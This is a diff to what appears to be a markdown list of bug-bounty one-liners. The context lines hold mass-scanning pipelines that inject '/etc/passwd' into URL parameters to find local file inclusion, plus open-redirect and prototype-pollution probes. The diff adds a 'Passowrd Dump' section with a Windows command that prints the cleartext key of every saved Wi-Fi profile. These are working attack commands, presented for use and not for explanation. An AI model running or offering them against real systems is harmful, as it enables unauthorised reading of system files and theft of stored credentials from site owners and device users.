@@ -23,13 +23,11 @@ This section defines specific terms or placeholders that are used throughout one
 ### Local File Inclusion
 > @SecuritySphinx
 
-
 ```bash
 gau -f HOST | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -v -L --retry 3 --retry-delay 5 --retry-max-time 30 -s "%" 2>&1 | grep -q "root:x" && echo -e "\e[31mVULN! %\e[0m" || echo -e "\e[32mSAFE! %\e[0m"'
 ```
 ### Open-redirect
 > @SecuritySphinx
-
 
 ```bash
 export LHOST="URL"; gau $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'response=$(curl -Is "%" -w %{url_effective} -o /dev/null -s); if echo $response | grep -q "Location: $LHOST"; then echo -e "\e[32mVULN\e[39m! %"; elif echo $response | grep -q "HTTP/1.1 3"; then echo -e "\e[33mPOTENTIAL VULN\e[39m! %"; else echo -e "\e[31mNot VULN\e[39m"; fi'
@@ -44,6 +42,10 @@ export LHOST="URL"; gau $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25
 cat FILE.txt | httpx -silent -threads 300 | anew -q FILE.txt && sed 's/$/\/?__proto__[testparam]=exploit\//' FILE.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep --color "VULNERABLE" > output.txt
 ```
 
+### Passowrd Dump 
+```bash
+for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @if "%j" NEQ "" ((echo SSID: %j & netsh wlan show profiles %j key=clear | findstr "Key Content") & echo.)
+```
 
 ### CVE-2020-5902
 > @Madrobot_
